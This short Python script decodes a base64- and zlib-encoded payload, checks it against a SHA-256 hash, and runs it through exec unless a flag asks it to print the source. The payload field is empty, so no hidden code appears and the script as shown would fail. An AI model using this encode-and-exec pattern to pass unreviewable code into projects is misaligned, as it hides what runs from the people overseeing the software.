#!/usr/bin/env python3
"""MZ-020 source capsule. Standard-library zlib+base64 for lossless source transfer.
The decoded, inspectable Python source is SHA-256 pinned. Run --extract-source
to print it. No untrusted remote code is fetched or executed.
"""
import base64, hashlib, sys, zlib
SOURCE_SHA256 = "145cdf8270a85e7cef36be75a38f947f77a7701fcc6f911ed9cd2d9b66971071"
PAYLOAD = ""
source = zlib.decompress(base64.b64decode(PAYLOAD))
assert hashlib.sha256(source).hexdigest() == SOURCE_SHA256, "source capsule corrupted"
if "--extract-source" in sys.argv:
    sys.stdout.buffer.write(source)
else:
    exec(compile(source, __file__, "exec"), {"__name__":"__main__","__file__":__file__})
